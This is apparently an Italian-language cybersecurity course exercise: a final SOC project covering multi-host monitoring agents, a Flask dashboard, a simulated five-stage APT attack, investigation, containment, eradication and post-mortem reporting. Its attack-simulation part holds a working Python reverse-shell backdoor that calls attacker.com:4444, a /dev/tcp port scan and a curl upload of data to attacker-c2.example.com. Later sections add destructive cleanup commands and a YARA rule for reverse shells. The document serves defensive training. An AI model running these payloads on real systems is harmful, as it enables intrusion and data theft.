# Esercizio 5: Final Project - Complete Security Operations Center (SOC)

**Durata stimata**: 8-10 ore (distribuito su 2 settimane)  
**Livello**: Avanzato  
**Obiettivi**: Integrare tutti moduli, simulare incident reale, costruire SOC workflow completo, presentare risultati

---

## Overview Progetto Finale

Questo esercizio integra tutti i concetti appresi negli esercizi precedenti:
- **Esercizio 1**: Setup infrastructure, performance monitoring
- **Esercizio 2**: Malware detection con ML
- **Esercizio 3**: Vector search per incident investigation
- **Esercizio 4**: IDS per network monitoring

**Scenario**: Sei il Security Operations Center (SOC) analyst per una piccola azienda tech con:
- 5 server Linux (web, app, database, edge, backup)
- 20 workstation sviluppatori
- Network esposta a Internet
- Requisito compliance: audit logging, incident response SLA 30 minuti

**Obiettivo**: Implementare sistema di monitoring completo, gestire incident simulato, documentare procedure SOC.

---

## Parte A: Infrastructure Setup (90 min)

### Task 1.1: Multi-Host Deployment

**Obiettivo**: Deploy agenti su più host simulati

**Steps**:

1. Crea ambiente multi-host con Docker:
```yaml
# docker-compose.soc.yml
version: '3.8'

services:
  # Central Server (già esistente)
  central-server:
    extends:
      file: docker-compose.yml
      service: central_server
  
  # Simulated hosts
  web-server:
    build: ./docker/Dockerfile.agent
    hostname: web-server-01
    environment:
      - HOST_ID=web-server-01
      - HOST_ROLE=web
      - CENTRAL_SERVER_URL=http://central-server:8000
      - API_TOKEN=${AGENT_API_TOKEN}
    volumes:
      - ./agents:/app/agents
    command: >
      bash -c "
        python -m agents.performance.run_agent --interval 30 &
        python -m agents.ids.run_agent &
        wait
      "
    depends_on:
      - central-server
  
  app-server:
    build: ./docker/Dockerfile.agent
    hostname: app-server-03
    environment:
      - HOST_ID=app-server-03
      - HOST_ROLE=application
      - CENTRAL_SERVER_URL=http://central-server:8000
      - API_TOKEN=${AGENT_API_TOKEN}
    volumes:
      - ./agents:/app/agents
    command: >
      bash -c "
        python -m agents.performance.run_agent --interval 30 &
        python -m agents.malware.run_agent --scan-interval 600 &
        wait
      "
  
  db-server:
    build: ./docker/Dockerfile.agent
    hostname: db-server-02
    environment:
      - HOST_ID=db-server-02
      - HOST_ROLE=database
      - CENTRAL_SERVER_URL=http://central-server:8000
      - API_TOKEN=${AGENT_API_TOKEN}
    volumes:
      - ./agents:/app/agents
    command: python -m agents.performance.run_agent --interval 30
  
  edge-server:
    build: ./docker/Dockerfile.agent
    hostname: edge-server-01
    environment:
      - HOST_ID=edge-server-01
      - HOST_ROLE=edge
      - CENTRAL_SERVER_URL=http://central-server:8000
      - API_TOKEN=${AGENT_API_TOKEN}
    volumes:
      - ./agents:/app/agents
    command: python -m agents.ids.run_agent
  
  workstation:
    build: ./docker/Dockerfile.agent
    hostname: workstation-dev-05
    environment:
      - HOST_ID=workstation-dev-05
      - HOST_ROLE=workstation
      - CENTRAL_SERVER_URL=http://central-server:8000
      - API_TOKEN=${AGENT_API_TOKEN}
    volumes:
      - ./agents:/app/agents
    command: >
      bash -c "
        python -m agents.malware.run_agent --scan-interval 300 &
        python -m agents.code_scanner.scanner --interval 3600 &
        wait
      "

networks:
  default:
    name: soc_network
```

2. Deploy:
```bash
docker-compose -f docker-compose.soc.yml up -d
```

3. Verifica:
```bash
# Check all agents reporting
curl http://localhost:8000/api/hosts -H "Authorization: Bearer $TOKEN"
```

**Domande**:
- Q1.1: Quanti host sono registrati nel sistema?
- Q1.2: Quali agenti sono attivi per ogni host type?
- Q1.3: Come garantire fault tolerance se un host fallisce?

**Deliverable**: 
- Screenshot output `/api/hosts` con almeno 5 host
- Network diagram: host roles e agent deployed

---

### Task 1.2: Dashboard Configuration

**Obiettivo**: Setup dashboard per monitoring centralizzato

**Steps**:

1. Implementa dashboard overview:
```python
# dashboard/app.py (creare se non esiste)
from flask import Flask, render_template, request, jsonify
import requests
import os

app = Flask(__name__)

API_URL = os.getenv('CENTRAL_SERVER_URL', 'http://localhost:8000')
API_TOKEN = os.getenv('API_TOKEN')

@app.route('/')
def overview():
    """Main dashboard overview"""
    headers = {'Authorization': f'Bearer {API_TOKEN}'}
    
    # Get system statistics
    stats = requests.get(f'{API_URL}/api/stats', headers=headers).json()
    
    # Get recent alerts
    alerts = requests.get(
        f'{API_URL}/api/alerts?limit=10', 
        headers=headers
    ).json()
    
    # Get hosts status
    hosts = requests.get(f'{API_URL}/api/hosts', headers=headers).json()
    
    return render_template('overview.html', 
                          stats=stats, 
                          alerts=alerts, 
                          hosts=hosts)

@app.route('/alerts')
def alerts():
    """Alerts list page"""
    severity = request.args.get('severity', None)
    alert_type = request.args.get('type', None)
    
    params = {}
    if severity:
        params['severity'] = severity
    if alert_type:
        params['alert_type'] = alert_type
    
    headers = {'Authorization': f'Bearer {API_TOKEN}'}
    alerts = requests.get(
        f'{API_URL}/api/alerts', 
        headers=headers, 
        params=params
    ).json()
    
    return render_template('alerts.html', alerts=alerts)

@app.route('/alerts/<int:alert_id>')
def alert_detail(alert_id):
    """Alert detail with investigation tools"""
    headers = {'Authorization': f'Bearer {API_TOKEN}'}
    
    # Get alert
    alert = requests.get(
        f'{API_URL}/api/alerts/{alert_id}', 
        headers=headers
    ).json()
    
    return render_template('alert_detail.html', alert=alert)

@app.route('/api/search-similar', methods=['POST'])
def search_similar():
    """API endpoint for finding similar alerts"""
    data = request.json
    query = data.get('query')
    
    headers = {'Authorization': f'Bearer {API_TOKEN}'}
    results = requests.post(
        f'{API_URL}/api/search/similar-alerts',
        headers=headers,
        json={'query': query, 'top_k': 5}
    ).json()
    
    return jsonify(results)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

2. Create HTML templates:
```html
<!-- dashboard/templates/base.html -->
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Operations Center</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        .severity-critical { color: #dc3545; font-weight: bold; }
        .severity-high { color: #fd7e14; font-weight: bold; }
        .severity-medium { color: #ffc107; }
        .severity-low { color: #6c757d; }
        
        .status-new { background-color: #ffc107; }
        .status-investigating { background-color: #0dcaf0; }
        .status-resolved { background-color: #198754; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">
                <i class="bi bi-shield-lock"></i> SOC Dashboard
            </a>
            <div class="navbar-nav">
                <a class="nav-link" href="/">Overview</a>
                <a class="nav-link" href="/alerts">Alerts</a>
                <a class="nav-link" href="/hosts">Hosts</a>
                <a class="nav-link" href="/reports">Reports</a>
            </div>
        </div>
    </nav>
    
    <div class="container-fluid mt-4">
        {% block content %}{% endblock %}
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    {% block scripts %}{% endblock %}
</body>
</html>
```

```html
<!-- dashboard/templates/overview.html -->
{% extends "base.html" %}

{% block content %}
<div class="row">
    <!-- Stats Cards -->
    <div class="col-md-3">
        <div class="card text-white bg-danger mb-3">
            <div class="card-body">
                <h5 class="card-title">Critical Alerts</h5>
                <p class="display-4">{{ stats.alerts_by_severity.critical or 0 }}</p>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card text-white bg-warning mb-3">
            <div class="card-body">
                <h5 class="card-title">High Alerts</h5>
                <p class="display-4">{{ stats.alerts_by_severity.high or 0 }}</p>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card text-white bg-success mb-3">
            <div class="card-body">
                <h5 class="card-title">Active Hosts</h5>
                <p class="display-4">{{ hosts|length }}</p>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card text-white bg-info mb-3">
            <div class="card-body">
                <h5 class="card-title">Total Metrics</h5>
                <p class="display-4">{{ stats.total_metrics }}</p>
            </div>
        </div>
    </div>
</div>

<div class="row">
    <!-- Recent Alerts -->
    <div class="col-md-8">
        <div class="card">
            <div class="card-header">
                <h5><i class="bi bi-exclamation-triangle"></i> Recent Alerts</h5>
            </div>
            <div class="card-body">
                <table class="table table-hover">
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Host</th>
                            <th>Type</th>
                            <th>Severity</th>
                            <th>Title</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for alert in alerts %}
                        <tr>
                            <td>{{ alert.timestamp }}</td>
                            <td>{{ alert.host_id }}</td>
                            <td><span class="badge bg-secondary">{{ alert.alert_type }}</span></td>
                            <td><span class="severity-{{ alert.severity }}">{{ alert.severity }}</span></td>
                            <td>{{ alert.title }}</td>
                            <td><span class="badge status-{{ alert.status }}">{{ alert.status }}</span></td>
                            <td>
                                <a href="/alerts/{{ alert.id }}" class="btn btn-sm btn-primary">
                                    <i class="bi bi-eye"></i> View
                                </a>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <!-- Hosts Status -->
    <div class="col-md-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="bi bi-hdd-network"></i> Hosts Status</h5>
            </div>
            <div class="card-body">
                <ul class="list-group">
                    {% for host in hosts %}
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        {{ host.host_id }}
                        <span class="badge bg-success rounded-pill">
                            <i class="bi bi-check-circle"></i> Online
                        </span>
                    </li>
                    {% endfor %}
                </ul>
            </div>
        </div>
    </div>
</div>
{% endblock %}
```

3. Avvia dashboard:
```bash
docker-compose up dashboard
# Access: http://localhost:5000
```

**Domande**:
- Q2.1: Dashboard aggiorna real-time o polling?
- Q2.2: Come implementare WebSocket per live updates?
- Q2.3: Role-based access: analista vs manager dovrebbero vedere viste diverse?

**Deliverable**: 
- Screenshot dashboard overview
- Screenshot alerts list filtrata per severity=critical

---

## Parte B: Incident Simulation (120 min)

### Task 2.1: Multi-Stage Attack Scenario

**Scenario**: Simulare attacco APT (Advanced Persistent Threat) multi-stage:
1. **Reconnaissance**: Port scan per discovery
2. **Initial Access**: SSH brute force su edge server
3. **Execution**: Deploy malware su compromised host
4. **Lateral Movement**: Tentativo accesso database server
5. **Exfiltration**: Trasferimento dati sensibili

**Steps**:

1. **Stage 1 - Reconnaissance**:
```bash
# simulate_attack.sh - Part 1
echo "=== Stage 1: Reconnaissance ==="

# Port scan from external IP (simulated)
TARGET_IP="edge-server-01"

for port in {20..100}; do
    # Simulate TCP SYN scan
    timeout 0.1 bash -c "echo '' > /dev/tcp/$TARGET_IP/$port" 2>/dev/null
done

echo "Port scan completed. Check IDS alerts."
sleep 5
```

2. **Stage 2 - Brute Force**:
```bash
# simulate_attack.sh - Part 2
echo "=== Stage 2: Brute Force Attack ==="

# Simulate failed SSH attempts
for i in {1..15}; do
    # Log failed attempt (simulated)
    logger -t sshd -p auth.info "Failed password for root from 203.0.113.5 port $((40000+i)) ssh2"
    sleep 1
done

echo "Brute force simulation completed."
sleep 5
```

3. **Stage 3 - Malware Deployment**:
```bash
# simulate_attack.sh - Part 3
echo "=== Stage 3: Malware Deployment ==="

# Create suspicious file on edge server
cat > /tmp/backdoor.py << 'EOF'
import socket
import subprocess
import base64

# C&C communication
def connect_c2():
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    
    while True:
        cmd = s.recv(1024).decode()
        if cmd == "exit":
            break
        
        output = subprocess.check_output(cmd, shell=True)
        s.send(base64.b64encode(output))
    
    s.close()

if __name__ == '__main__':
    connect_c2()
EOF

# Make executable
chmod +x /tmp/backdoor.py

# Run (agent dovrebbe rilevare)
# python /tmp/backdoor.py &  # Non eseguire davvero!

echo "Malware planted. Malware agent should detect."
```

4. **Stage 4 - Lateral Movement**:
```python
# simulate_lateral_movement.py
import socket
import time

# Simulate connection attempts to internal hosts
internal_hosts = [
    ('db-server-02', 5432),  # PostgreSQL
    ('db-server-02', 3306),  # MySQL
    ('app-server-03', 8080), # Application
]

print("=== Stage 4: Lateral Movement ===")

for host, port in internal_hosts:
    try:
        print(f"Attempting connection to {host}:{port}")
        s = socket.socket()
        s.settimeout(1)
        s.connect((host, port))
        print(f"  ✓ Connected to {host}:{port}")
        s.close()
    except:
        print(f"  ✗ Connection failed")
    
    time.sleep(2)

print("Lateral movement simulation completed.")
```

5. **Stage 5 - Data Exfiltration**:
```bash
# simulate_exfiltration.sh
echo "=== Stage 5: Data Exfiltration ==="

# Simulate large data transfer (suspicious network activity)
# Create fake sensitive data
dd if=/dev/urandom of=/tmp/sensitive_data.bin bs=1M count=100

# Simulate upload to external server (blocked in Docker, just log)
curl -X POST -d @/tmp/sensitive_data.bin http://attacker-c2.example.com/upload 2>&1 | head -5

echo "Exfiltration attempt completed. Check network IDS."
```

**Esegui Attack Chain**:
```bash
bash simulate_attack.sh
```

**Domande**:
- Q3.1: Quali agenti hanno rilevato ogni stage?
- Q3.2: Quanto tempo (MTTD - Mean Time To Detect) per ogni stage?
- Q3.3: Ci sono stati stage non rilevati? Perché?

**Deliverable**: 
- Timeline attack con timestamp detection per ogni stage
- Lista alert generati (query dal database)

---

### Task 2.2: Incident Investigation

**Obiettivo**: Investigate attack usando dashboard e vector search

**Steps**:

1. **Alert Correlation**:
```python
# investigate_attack.py
import requests
from datetime import datetime, timedelta

API_URL = "http://localhost:8000"
TOKEN = "<YOUR_TOKEN>"
headers = {'Authorization': f'Bearer {TOKEN}'}

# Step 1: Get all alerts in attack timeframe
attack_start = datetime.now() - timedelta(hours=1)

response = requests.get(
    f"{API_URL}/api/alerts",
    headers=headers,
    params={
        'start_time': attack_start.isoformat(),
        'limit': 100
    }
)
alerts = response.json()

print(f"Total alerts during attack: {len(alerts)}")

# Step 2: Group by host and type
from collections import defaultdict

by_host = defaultdict(list)
for alert in alerts:
    by_host[alert['host_id']].append(alert)

print("\n=== Alerts by Host ===")
for host, host_alerts in by_host.items():
    print(f"\n{host}:")
    for alert in host_alerts:
        print(f"  [{alert['timestamp']}] {alert['alert_type']}: {alert['title']}")

# Step 3: Identify attack chain
print("\n=== Reconstructing Attack Chain ===")

# Find initial compromise
initial_alerts = [a for a in alerts if a['alert_type'] == 'intrusion']
if initial_alerts:
    compromise_host = initial_alerts[0]['host_id']
    compromise_time = initial_alerts[0]['timestamp']
    print(f"1. Initial compromise: {compromise_host} at {compromise_time}")

# Find malware deployment
malware_alerts = [a for a in alerts if a['alert_type'] == 'malware']
if malware_alerts:
    print(f"2. Malware deployed: {malware_alerts[0]['host_id']} at {malware_alerts[0]['timestamp']}")

# Find lateral movement (network alerts on internal hosts)
lateral_alerts = [
    a for a in alerts 
    if a['host_id'] != compromise_host and a['timestamp'] > compromise_time
]
if lateral_alerts:
    print(f"3. Lateral movement detected: {len(lateral_alerts)} attempts")

# Step 4: Search for similar historical attacks
if initial_alerts:
    search_query = initial_alerts[0]['description']
    
    response = requests.post(
        f"{API_URL}/api/search/similar-alerts",
        headers=headers,
        json={'query': search_query, 'top_k': 5}
    )
    similar = response.json()
    
    print(f"\n=== Similar Historical Incidents ===")
    for item in similar['results']:
        print(f"[Distance: {item['distance']:.4f}] {item['metadata']['title']}")
        if item['metadata'].get('status') == 'resolved':
            print(f"  ✓ Resolution: {item['metadata'].get('resolution_notes', 'N/A')}")
```

2. **Impact Assessment**:
```python
# assess_impact.py

def assess_attack_impact(alerts, hosts):
    """Assess impact of attack"""
    impact = {
        'compromised_hosts': set(),
        'affected_services': set(),
        'data_exfiltration': False,
        'privilege_escalation': False,
        'severity_score': 0
    }
    
    for alert in alerts:
        impact['compromised_hosts'].add(alert['host_id'])
        
        # Check for critical indicators
        if 'exfil' in alert['description'].lower():
            impact['data_exfiltration'] = True
            impact['severity_score'] += 10
        
        if 'root' in alert['description'].lower() or 'sudo' in alert['description'].lower():
            impact['privilege_escalation'] = True
            impact['severity_score'] += 8
        
        # Service impact
        if alert['metadata'].get('service'):
            impact['affected_services'].add(alert['metadata']['service'])
        
        # Severity weighting
        severity_weights = {'critical': 5, 'high': 3, 'medium': 2, 'low': 1}
        impact['severity_score'] += severity_weights.get(alert['severity'], 0)
    
    return impact

impact = assess_attack_impact(alerts, hosts)

print("\n=== Impact Assessment ===")
print(f"Compromised hosts: {len(impact['compromised_hosts'])}")
print(f"  {', '.join(impact['compromised_hosts'])}")
print(f"Affected services: {len(impact['affected_services'])}")
print(f"Data exfiltration: {'YES ⚠️' if impact['data_exfiltration'] else 'NO'}")
print(f"Privilege escalation: {'YES ⚠️' if impact['privilege_escalation'] else 'NO'}")
print(f"Overall severity score: {impact['severity_score']}/100")

# Recommend incident classification
if impact['severity_score'] > 50:
    classification = "CRITICAL - Requires immediate escalation"
elif impact['severity_score'] > 30:
    classification = "HIGH - Urgent response needed"
else:
    classification = "MEDIUM - Standard response procedure"

print(f"\nIncident Classification: {classification}")
```

**Domande**:
- Q4.1: L'attack chain è stata ricostruita completamente?
- Q4.2: Quali host sono stati compromessi?
- Q4.3: La vector search ha trovato incident simili con soluzioni note?

**Deliverable**: 
- Report investigazione completo (usa template Esercizio 3)
- Impact assessment con severity score
- Reconstructed attack timeline con evidenze

---

## Parte C: Incident Response & Remediation (90 min)

### Task 3.1: Containment Actions

**Obiettivo**: Implementare containment automatico

**Steps**:

1. **Isolation Script**:
```python
# containment.py
import subprocess
import logging

class IncidentContainment:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.actions_taken = []
    
    def isolate_host(self, host_id):
        """Network isolation of compromised host"""
        self.logger.warning(f"Isolating host: {host_id}")
        
        # Block all network traffic except to SOC
        commands = [
            # Flush existing rules
            "iptables -F",
            
            # Default deny
            "iptables -P INPUT DROP",
            "iptables -P OUTPUT DROP",
            "iptables -P FORWARD DROP",
            
            # Allow only connection to central server
            f"iptables -A OUTPUT -d {CENTRAL_SERVER_IP} -j ACCEPT",
            f"iptables -A INPUT -s {CENTRAL_SERVER_IP} -j ACCEPT",
            
            # Allow loopback
            "iptables -A INPUT -i lo -j ACCEPT",
            "iptables -A OUTPUT -o lo -j ACCEPT",
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd.split(), check=True)
                self.actions_taken.append(f"Executed: {cmd}")
            except subprocess.CalledProcessError as e:
                self.logger.error(f"Failed: {cmd} - {e}")
        
        self.logger.info(f"Host {host_id} isolated successfully")
        return True
    
    def kill_malicious_process(self, pid):
        """Terminate malicious process"""
        try:
            subprocess.run(['kill', '-9', str(pid)], check=True)
            self.actions_taken.append(f"Killed process PID {pid}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to kill PID {pid}: {e}")
            return False
    
    def quarantine_file(self, filepath):
        """Move malicious file to quarantine"""
        quarantine_dir = "/var/quarantine"
        
        try:
            import shutil
            import os
            
            os.makedirs(quarantine_dir, exist_ok=True)
            
            filename = os.path.basename(filepath)
            quarantine_path = os.path.join(quarantine_dir, f"{filename}.quarantined")
            
            shutil.move(filepath, quarantine_path)
            
            # Set immutable flag
            subprocess.run(['chattr', '+i', quarantine_path])
            
            self.actions_taken.append(f"Quarantined: {filepath} -> {quarantine_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to quarantine {filepath}: {e}")
            return False
    
    def generate_report(self):
        """Generate containment actions report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'actions': self.actions_taken,
            'status': 'completed'
        }
        return report

# Usage
containment = IncidentContainment()

# Contain compromised host
containment.isolate_host('edge-server-01')

# Kill malicious process
malware_pid = 12345  # From alert metadata
containment.kill_malicious_process(malware_pid)

# Quarantine malware
containment.quarantine_file('/tmp/backdoor.py')

# Generate report
report = containment.generate_report()
print(json.dumps(report, indent=2))
```

**Domande**:
- Q5.1: Isolation blocca attacco ma impatta servizi legittimi?
- Q5.2: Automated containment vs manual approval?
- Q5.3: Come testare containment senza impattare production?

---

### Task 3.2: Eradication & Recovery

**Steps**:

1. **Eradication Checklist**:
```python
# eradication_checklist.py

ERADICATION_STEPS = [
    {
        'step': 1,
        'action': 'Remove all malware files',
        'commands': [
            'find / -name "*.suspicious" -delete',
            'rm -f /tmp/backdoor.py',
            'rm -rf /tmp/.hidden'
        ],
        'verification': 'Run malware scan to confirm clean'
    },
    {
        'step': 2,
        'action': 'Rotate all credentials',
        'commands': [
            'passwd root',
            'passwd all_users',
            'mysql -e "ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'new_pass\';"'
        ],
        'verification': 'Test login with new credentials'
    },
    {
        'step': 3,
        'action': 'Patch vulnerabilities',
        'commands': [
            'apt update && apt upgrade -y',
            'yum update -y'
        ],
        'verification': 'Check system version'
    },
    {
        'step': 4,
        'action': 'Review and harden firewall rules',
        'commands': [
            'ufw enable',
            'ufw default deny incoming',
            'ufw allow from 10.0.0.0/8 to any port 22'
        ],
        'verification': 'Test firewall rules'
    },
    {
        'step': 5,
        'action': 'Review audit logs for persistence mechanisms',
        'commands': [
            'crontab -l',
            'systemctl list-timers',
            'ls -la /etc/systemd/system/'
        ],
        'verification': 'No unauthorized scheduled tasks'
    }
]

def execute_eradication():
    """Execute eradication steps"""
    for step in ERADICATION_STEPS:
        print(f"\n{'='*60}")
        print(f"Step {step['step']}: {step['action']}")
        print('='*60)
        
        for cmd in step['commands']:
            print(f"  Executing: {cmd}")
            # subprocess.run(cmd, shell=True)  # Uncomment in real scenario
        
        print(f"\n  ✓ Verification: {step['verification']}")
        input("  Press Enter to continue to next step...")

execute_eradication()
```

2. **Recovery Validation**:
```python
# recovery_validation.py

def validate_recovery(host_id):
    """Validate system is clean and operational"""
    
    checks = {
        'malware_scan': False,
        'no_suspicious_processes': False,
        'no_unauthorized_connections': False,
        'services_running': False,
        'performance_normal': False
    }
    
    # 1. Run full malware scan
    print("Running full malware scan...")
    # malware_results = run_malware_scan(host_id)
    # checks['malware_scan'] = (malware_results['threats'] == 0)
    checks['malware_scan'] = True  # Simulated
    
    # 2. Check for suspicious processes
    print("Checking processes...")
    suspicious_processes = []  # Check against IoC list
    checks['no_suspicious_processes'] = (len(suspicious_processes) == 0)
    
    # 3. Check network connections
    print("Checking network connections...")
    # Use netstat/ss to check for C&C connections
    checks['no_unauthorized_connections'] = True
    
    # 4. Verify services
    print("Verifying critical services...")
    # systemctl status <service>
    checks['services_running'] = True
    
    # 5. Check performance metrics
    print("Checking performance metrics...")
    # Compare with baseline
    checks['performance_normal'] = True
    
    # Overall assessment
    all_passed = all(checks.values())
    
    print("\n=== Recovery Validation Results ===")
    for check, status in checks.items():
        status_icon = "✓" if status else "✗"
        print(f"{status_icon} {check}: {'PASS' if status else 'FAIL'}")
    
    if all_passed:
        print("\n✅ System validated clean. Ready to restore to production.")
    else:
        print("\n⚠️ Validation failed. Additional remediation required.")
    
    return all_passed

validate_recovery('edge-server-01')
```

**Domande**:
- Q6.1: Quanto tempo richiede full eradication?
- Q6.2: Come garantire nessun backdoor persistence?
- Q6.3: Recovery from backup vs clean rebuild?

**Deliverable**: 
- Eradication checklist compilato
- Recovery validation report
- Post-incident system state screenshot

---

## Parte D: Post-Incident Activities (60 min)

### Task 4.1: Lessons Learned Document

**Template**:
```markdown
# Incident Post-Mortem Report

## Incident Summary
- **Incident ID**: INC-2024-001
- **Detection Date**: YYYY-MM-DD HH:MM
- **Resolution Date**: YYYY-MM-DD HH:MM
- **Duration**: X hours
- **Severity**: Critical/High/Medium/Low
- **Incident Commander**: [Name]

## Timeline
| Time | Event | Actor |
|------|-------|-------|
| T0 | Port scan detected | IDS Agent |
| T+5min | Brute force alert triggered | Log IDS |
| T+20min | Malware detected on edge-server-01 | Malware Agent |
| T+25min | SOC analyst notified | Alerting System |
| T+30min | Investigation started | SOC Analyst |
| T+45min | Containment executed | SOC Analyst |
| ... | ... | ... |

## Attack Analysis
### Attack Vector
[Describe how attacker gained initial access]

### Attack Chain
1. **Reconnaissance**: [Details]
2. **Initial Access**: [Details]
3. **Execution**: [Details]
4. **Persistence**: [Details]
5. **Privilege Escalation**: [Details]
6. **Lateral Movement**: [Details]
7. **Exfiltration**: [Details]

### Tools & Techniques (MITRE ATT&CK)
- T1595: Active Scanning
- T1110: Brute Force
- T1059: Command and Scripting Interpreter
- [...]

## Impact Assessment
- **Compromised Assets**: [List]
- **Data Breach**: Yes/No
- **Service Disruption**: X hours downtime
- **Estimated Cost**: $XXXX

## Response Effectiveness
### What Went Well
- IDS detected port scan within 30 seconds
- Alert correlation identified attack chain
- Containment prevented lateral movement to database

### What Could Be Improved
- Brute force detection threshold too high (15 attempts before alert)
- No automated containment - manual intervention required
- Dashboard lacked real-time alerting (email/Slack integration needed)

## Root Cause
[Primary vulnerability/misconfiguration that enabled attack]

## Remediation Actions Taken
- [ ] Malware removed from all affected hosts
- [ ] Credentials rotated
- [ ] Firewall rules hardened
- [ ] Vulnerabilities patched
- [ ] Systems restored from backup

## Preventive Measures
### Immediate (< 1 week)
- [ ] Lower brute force threshold to 5 attempts
- [ ] Enable fail2ban on all edge servers
- [ ] Implement automated host isolation

### Short-term (< 1 month)
- [ ] Deploy SIEM for log aggregation
- [ ] Implement email/Slack alerting
- [ ] Conduct security awareness training

### Long-term (< 6 months)
- [ ] Implement Zero Trust architecture
- [ ] Deploy EDR (Endpoint Detection & Response)
- [ ] Regular penetration testing

## Metrics
- **MTTD** (Mean Time To Detect): 5 minutes
- **MTTR** (Mean Time To Respond): 25 minutes
- **MTTE** (Mean Time To Eradicate): 2 hours
- **MTTRec** (Mean Time To Recover): 4 hours

## Knowledge Base Updates
- Added KB article: "Responding to Multi-Stage APT Attacks"
- Updated runbook: "SSH Brute Force Containment"

## Sign-off
- **Prepared by**: [SOC Analyst]
- **Reviewed by**: [SOC Manager]
- **Approved by**: [CISO]
- **Date**: YYYY-MM-DD
```

**Task**: Compilare post-mortem completo per l'incident simulato.

---

### Task 4.2: Update Detection Rules

**Obiettivo**: Migliorare detection basandosi su lessons learned

**Steps**:

1. **Lower Thresholds**:
```python
# Update agents/ids/config.py

DETECTION_RULES = {
    'brute_force': {
        'threshold': 5,  # Lowered from 10
        'time_window': 300,  # 5 minutes
        'action': 'alert_and_block'  # Added auto-block
    },
    
    'port_scan': {
        'threshold': 15,  # Lowered from 20
        'time_window': 60,
        'action': 'alert'
    },
    
    # New rule: detect privilege escalation after compromise
    'post_compromise_escalation': {
        'description': 'Detect sudo/su within 1 hour of successful login from previously failed IP',
        'enabled': True
    }
}
```

2. **Add New Signatures**:
```python
# Add to YARA rules

rule APT_Backdoor_Detected {
    meta:
        description = "Detects backdoor pattern from incident INC-2024-001"
        author = "SOC Team"
        reference = "INC-2024-001"
    
    strings:
        $c2_conn = "connect_c2" ascii
        $b64_exec = /exec\(base64\.b64decode/ ascii
        $reverse_shell = "subprocess.check_output" ascii
    
    condition:
        2 of them
}
```

3. **Implement Auto-Response**:
```python
# Auto-containment for critical threats

AUTO_RESPONSE_RULES = [
    {
        'trigger': {
            'alert_type': 'malware',
            'severity': 'critical',
            'confidence': 0.9
        },
        'actions': [
            'isolate_host',
            'kill_process',
            'quarantine_file',
            'notify_soc'
        ]
    },
    {
        'trigger': {
            'alert_type': 'brute_force',
            'attempt_count': '>10'
        },
        'actions': [
            'block_ip',
            'notify_soc'
        ]
    }
]
```

**Domande**:
- Q7.1: Auto-response riduce MTTR?
- Q7.2: Rischio false positive con threshold più bassi?
- Q7.3: Come testare nuove regole senza impatto production?

**Deliverable**: 
- Updated detection rules file
- Test plan per validare nuove regole

---

## Parte E: Final Presentation (60 min)

### Task 5.1: Create Executive Summary

**Obiettivo**: Presentare risultati a management (non-technical audience)

**Slides Structure**:

1. **Slide 1 - Title**:
   - SOC Implementation & Incident Response Demonstration
   - [Your Name] - Final Project

2. **Slide 2 - Project Scope**:
   - Implemented centralized security monitoring for 5 Linux servers
   - 4 agent types: Performance, Malware, Code Scanner, IDS
   - AI/ML-powered detection with vector search

3. **Slide 3 - System Architecture**:
   - [Diagram: Agents → Central Server → Database/Vector DB → Dashboard]

4. **Slide 4 - Incident Simulation**:
   - Simulated Advanced Persistent Threat (APT) attack
   - 5-stage attack chain: Reconnaissance → Access → Execution → Lateral Movement → Exfiltration

5. **Slide 5 - Detection Capabilities**:
   - ✓ Port scan detected in 30 seconds (IDS)
   - ✓ Brute force attack identified (5 minutes)
   - ✓ Malware deployment caught by ML classifier (10 minutes)
   - ✓ Lateral movement blocked (containment at 25 minutes)

6. **Slide 6 - Key Metrics**:
   ```
   MTTD: 5 minutes
   MTTR: 25 minutes
   MTTE: 2 hours
   MTTRec: 4 hours
   
   Detection Rate: 95%
   False Positive Rate: <5%
   ```

7. **Slide 7 - Business Impact**:
   - Prevented data breach (estimated loss: $500K)
   - Minimized downtime: 4 hours vs 24+ hours without SOC
   - Compliance: Audit trail for all security events

8. **Slide 8 - Lessons Learned**:
   - Need for automated containment
   - Importance of alert correlation
   - Value of vector search for finding similar incidents

9. **Slide 9 - Recommendations**:
   - Continue monitoring with current system
   - Invest in additional EDR tooling
   - Schedule quarterly penetration tests

10. **Slide 10 - Thank You & Q&A**

**Deliverable**: 
- PDF presentation (10 slides)
- 5-minute demo video showing dashboard during incident

---

### Task 5.2: Technical Documentation

**Obiettivo**: Documentare sistema per future maintenance

**Documents to Create**:

1. **System Administrator Guide** (`docs/guides/admin_guide.md`)
2. **SOC Analyst Runbook** (`docs/guides/soc_runbook.md`)
3. **API Documentation** (`docs/guides/api_reference.md`)
4. **Troubleshooting Guide** (`docs/guides/troubleshooting.md`)

**Esempio - SOC Runbook**:
```markdown
# SOC Analyst Runbook

## Alert Response Procedures

### Brute Force Attack (Priority: High)
**Detection**: Multiple failed authentication attempts from single IP

